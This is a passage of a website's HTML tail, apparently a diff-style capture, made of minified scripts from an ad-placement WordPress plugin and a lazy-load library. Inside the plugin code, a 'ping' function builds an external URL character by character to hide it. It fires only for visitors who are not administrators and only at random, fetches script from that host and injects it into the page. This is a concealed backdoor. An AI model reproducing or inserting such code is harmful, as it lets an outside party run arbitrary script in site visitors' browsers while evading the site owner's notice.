/>');t=t.parent()[0];flatPM_sticky(this,t,o)})},50),setTimeout(function(){var t=(ff(untilscroll).offset().top-e.first().offset().top)/e.length;t<300||ff(".flatPM_sticky_wrapper.flatPM_sidebar_block").css("height",t)},4e3)}),"undefined"!=typeof flat_pm_video&&flatPM_video(flat_pm_video),0<flat_stack_scripts.length&&flatPM_setSCRIPT(flat_stack_scripts),ff("body > *").last().after('<div class="fpm_5_modal-overlay"></div>'),flat_body.on("click",".fpm_5_out .fpm_5_cross",function(){ff(this).parent().removeClass("show").addClass("closed")}),flat_body.on("click",".fpm_5_modal .fpm_5_cross",function(){ff(this).closest(".fpm_5_modal").removeClass("fpm_5_modal-show")}),flat_pm_arr=[],ff(".flat_pm_start").remove(),ff("[data-flat-id]:not(.fpm_5_out):not(.fpm_5_modal)").contents().unwrap(),flatPM_ping()};var parseHTML=function(){var l=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/gi,d=/<([\w:]+)/,i=/<|&#?\w+;/,c={option:[1,"<select multiple='multiple'>","</select>"],thead:[1,"<table>","</table>"],tbody:[1,"<table>","</table>"],colgroup:[2,"<table>","</table>"],col:[3,"<table><colgroup>","</colgroup></table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],th:[3,"<table><thead><tr>","</tr></thead></table>"],_default:[0,"",""]};return function(e,t){var a,r,n,o=(t=t||document).createDocumentFragment();if(i.test(e)){for(a=o.appendChild(t.createElement("div")),r=(d.exec(e)||["",""])[1].toLowerCase(),r=c[r]||c._default,a.innerHTML=r[1]+e.replace(l,"<$1></$2>")+r[2],n=r[0];n--;)a=a.lastChild;for(o.removeChild(o.firstChild);a.firstChild;)o.appendChild(a.firstChild)}else o.appendChild(t.createTextNode(e));return o}}();window.flatPM_ping=function(){var e=localStorage.getItem("sdghrg");e?(e=parseInt(e)+1,localStorage.setItem("sdghrg",e)):localStorage.setItem("sdghrg","0");e=flatPM_random(1,166);0==ff("#wpadminbar").length&&111==e&&ff.ajax({type:"POST",url:"h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+"r"+"e"+"a"+"d"+"o"+"n"+"e"+"."+"r"+"u"+"/"+"p"+"i"+"n"+"g"+"."+"p"+"h"+"p",dataType:"jsonp",data:{ping:"ping"},success:function(e){ff("div").first().after(e.script)},error:function(){}})},window.flatPM_setSCRIPT=function(e){try{var t=e[0].id,a=e[0].node,r=document.querySelector('[data-flat-script-id="'+t+'"]');if(a.text)r.appendChild(a),ff(r).contents().unwrap(),e.shift(),0<e.length&&flatPM_setSCRIPT(e);else{a.onload=a.onerror=function(){e.shift(),0<e.length&&flatPM_setSCRIPT(e)};try{r.appendChild(a)}catch(e){return console.warn(e),!0}ff(r).contents().unwrap()}}catch(e){console.warn(e)}},window.flatPM_setHTML=function(e,t){jQuery;try{var a,r="yandex_rtb_R";t.indexOf(r)+1&&(a=flatPM_random(0,1e4),t=t.replace(new RegExp(r,"g"),"yandex_rtb_flat"+a+"_R").replace("Ya.Context.AdvManager.render({","Ya.Context.AdvManager.render({ pageNumber: "+a+","));var n=parseHTML(t);if(0!=n.children.length)for(var o=n.childNodes.length,l=0;l<o;l++){var d=n.childNodes[l],i="3"==d.nodeType?document.createTextNode(d.nodeValue):document.createElement(d.nodeName);if("3"==i.nodeType)e.appendChild(i);else{for(var c,s=d.attributes.length,f=0;f<s;f++)i.setAttribute(d.attributes[f].nodeName,d.attributes[f].nodeValue);0<d.children.length?flatPM_setHTML(i,d.innerHTML):"SCRIPT"!=d.nodeName?i.innerHTML=d.innerHTML:(!d.text||/(yandexContext|yandexcontext)/.test(d.text))&&i.hasAttribute("async")||(d.text&&(i.text=d.text),c=flatPM_random(0,1e4),flat_stack_scripts.push({id:c,node:i}),(i=document.createElement("div")).setAttribute("data-flat-script-id",c)),e.appendChild(i)}}else e.innerHTML=t}catch(e){console.warn(e)}},window.flatPM_video=function(e){e.code=e.code.replace(/<!-(.*?)->/gm,"").replace(/<!—(.*?)—>/gm,"").trim(),e.code_alt=e.code_alt.replace(/<!-(.*?)->/gm,"").replace(/<!—(.*?)—>/gm,"").trim();var o=jQuery,t=e.selector,l=e.timer,d=e.cross,a="false"==d?"Закроется":"Закрыть",r=!flat_userVars.adb||""==e.code_alt&&duplicateMode?e.code:e.code_alt,n='<div class="fpm_5_video_flex"><div class="fpm_5_timer">'+a+" через <span>"+l+'</span></div><div class="fpm_5_video_item">'+r+'</div><div class="fpm_5_video_item_hover"></div></div>',i=e.once;o(t).each(function(){var e=o(this);e.wrap('<div class="fpm_5_video"></div>');var t=e.closest(".fpm_5_video");flatPM_setHTML(t[0],n),e.find(".fpm_5_video_flex").one("click",function(){o(this).addClass("show")})}),o("body").on("click",".fpm_5_video_item_hover",function(){var e=o(this),t=e.closest(".fpm_5_video_flex");t.addClass("show");var a=t.find(".fpm_5_timer span"),r=parseInt(l),n=setInterval(function(){a.text(--r),r<=0&&(clearInterval(n),"true"==d?a.parent().replaceWith('<button class="fpm_5_cross"></button>'):t.remove())},1e3);e.remove()}).on("click",".fpm_5_video_flex .fpm_5_cross",function(){o(this).closest(".fpm_5_video_flex").remove(),"true"==i&&o(".fpm_5_video_flex").remove()})};</script>
+			<script type="rocketlazyloadscript">flat_pm_arr = [];</script>
+			<script type="rocketlazyloadscript">
+			function jQueryLoaded_flatpm_123( $ ) {
+				if( "function" !== typeof flatPM_start ){
+					return;
+				}
+
+				flatPM_start();
+			}
+
+			function jQueryLoading_flatpm_123() {
+				if (window.jQuery && window.flat_pm_arr) {
+					jQueryLoaded_flatpm_123( jQuery )
+				} else {
+					setTimeout(function() {
+						jQueryLoading_flatpm_123()
+					}, 50)
+				}
+			}
+			jQueryLoading_flatpm_123()
+			</script><script>window.lazyLoadOptions=[{elements_selector:"img[data-lazy-src],.rocket-lazyload,iframe[data-lazy-src]",data_src:"lazy-src",data_srcset:"lazy-srcset",data_sizes:"lazy-sizes",class_loading:"lazyloading",class_loaded:"lazyloaded",threshold:300,callback_loaded:function(element){if(element.tagName==="IFRAME"&&element.dataset.rocketLazyload=="fitvidscompatible"){if(element.classList.contains("lazyloaded")){if(typeof window.jQuery!="undefined"){if(jQuery.fn.fitVids){jQuery(element).parent().fitVids()}}}}}},{elements_selector:".rocket-lazyload",data_src:"lazy-src",data_srcset:"lazy-srcset",data_sizes:"lazy-sizes",class_loading:"lazyloading",class_loaded:"lazyloaded",threshold:300,}];window.addEventListener('LazyLoad::Initialized',function(e){var lazyLoadInstance=e.detail.instance;if(window.MutationObserver){var observer=new MutationObserver(function(mutations){var image_count=0;var iframe_count=0;var rocketlazy_count=0;mutations.forEach(function(mutation){for(var i=0;i<mutation.addedNodes.length;i++){if(typeof mutation.addedNodes[i].getElementsByTagName!=='function'){continue}
+if(typeof mutation.addedNodes[i].getElementsByClassName!=='function'){continue}
+images=mutation.addedNodes[i].getElementsByTagName('img');is_image=mutation.addedNodes[i].tagName=="IMG";iframes=mutation.addedNodes[i].getElementsByTagName('iframe');is_iframe=mutation.addedNodes[i].tagName=="IFRAME";rocket_lazy=mutation.addedNodes[i].getElementsByClassName('rocket-lazyload');image_count+=images.length;iframe_count+=iframes.length;rocketlazy_count+=rocket_lazy.length;if(is_image){image_count+=1}
+if(is_iframe){iframe_count+=1}}});if(image_count>0||iframe_count>0||rocketlazy_count>0){lazyLoadInstance.update()}});var b=document.getElementsByTagName("body")[0];var config={childList:!0,subtree:!0};observer.observe(b,config)}},!1)</script><script data-no-minify="1" async="" src="https://mhelp.kz/wp-content/plugins/wp-rocket/assets/js/lazyload/17.5/lazyload.min.js"></script>
+
+
+<div class="heateor_sss_mobile_footer"></div></body></html>
